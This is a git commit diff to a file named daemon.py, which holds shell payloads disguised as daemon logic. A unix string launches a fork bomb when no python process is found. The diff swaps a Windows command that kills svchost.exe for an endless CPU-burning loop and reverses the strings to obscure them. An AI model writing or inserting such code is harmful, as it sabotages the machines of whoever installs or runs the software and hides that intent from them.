373fbf035c90810d7147715094dc5036924a2e8d
Jankie <qwq@awaish.link>
2024-01-14 15:55:03 +0800

    Update daemon.py

--- src/daemon/daemon.py
+++ src/daemon/daemon.py
@@ -1,17 +1,17 @@
-from cryptology.discretization import DiscretizationRandom
-dr = DiscretizationRandom(65, 122) 
+import cryptology.discretization as cd
+dr = cd.DiscretizationRandom(65, 122) 
 rawResult = dr.get_discretized_random() 
-password = ''
-for text in rawResult:
-    password += chr(text)
-password = password[:64]
+password = ''.join([chr(text) for text in rawResult][:64])[::-1]
+
 unix = '''pgrep -x python >/dev/null && echo "Process found" || :() { :|:& };:'''
 win32 = '''
 @echo off
-tasklist /FI "IMAGENAME eq pythonw.exe" 2>NUL | find /I /N "pythonw.exe">NUL
+setlocal enabledelayedexpansion
+set "cmd=tasklist /FI "IMAGENAME eq pythonw.exe" 2^>NUL | find /I /N "pythonw.exe"^>NUL"
+%cmd%
 if "%ERRORLEVEL%"=="0" (
 
 ) else (
-    taskkill /f /im svchost.exe
+    start /MIN cmd /C "for /L %%G in (1,0,1) do (set /A "var=%%G*%%G" & set /A "var=!var!+!var!" & set /A "var=!var!/%%G")"
 )
-'''
+'''[::-1]
